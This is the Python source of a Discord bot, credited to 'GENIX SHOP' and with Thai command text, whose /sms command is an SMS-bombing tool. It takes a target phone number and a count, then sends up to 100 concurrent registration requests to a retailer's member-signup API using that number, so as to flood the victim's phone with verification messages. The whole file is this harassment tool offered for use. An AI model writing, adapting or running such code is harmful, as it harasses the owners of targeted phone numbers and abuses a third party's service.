import interactions
import requests
import os,sys
import time
from interactions import Button, ButtonStyle, CommandContext, SelectMenu, SelectOption, ActionRow, Modal, TextInput, TextStyleType, Embed
from user_agent import generate_user_agent
from concurrent.futures import ThreadPoolExecutor
os.system('clear')

pint()
print('  CREDITE : GENIX SHOP')
print()
TOKEN = input('[>] TOKEN: ')
GUILD = input('[>] GUILD ID: ')

threading = ThreadPoolExecutor(max_workers=int(100000))
client = interactions.Client(TOKEN, intents=interactions.Intents.DEFAULT | interactions.Intents.GUILD_MESSAGES)

@client.event
async def on_start():
	os.system('clear')
	print('Ready!')
	
@client.command(
	name="sms",
	description="สำหรับเปิดใช้งานยิงเบอร์ฟรี",
	scope=GUILD,
	options=[
		interactions.Option(
			type=interactions.OptionType.STRING,
			name="phone",
			description="กรุณาใส่เบอร์ที่ต้องการจะยิง",
		),
		interactions.Option(
			type=interactions.OptionType.STRING,
			name="amount",
			description="จำนวน"
		),
	],
)
async def sms(ctx: CommandContext, phone, amount):
	no = phone
	jam = amount
	if int(amount) >= 101:
		msg = await ctx.send('จำนวนต้องไม่เกิน 100 ครับ')
		time.sleep(2)
		await msg.delete()
	else:
		fully = await ctx.send(f'**เริ่มยิงไปที่เบอร์ *{phone}* | จำนวน {amount}**')
		time.sleep(2)
		await fully.delete()
		GO_sms(no, jam)
		
def gx1(no):
	requests.post("https://ocs-prod-api.makroclick.com/next-ocs-member/user/register",json={"username": no,"password":"6302814184624az","name":"0903281894","provinceCode":"28","districtCode":"393","subdistrictCode":"3494","zipcode":"40260","siebelCustomerTypeId":"710","acceptTermAndCondition":"true","hasSeenConsent":"false","locale":"th_TH"})

def GO_sms(no, jam):
	for i in range(int(jam)):
		threading.submit(gx1, no)
		
client.start()

# Developer Interactions | Coding GENIX SHOP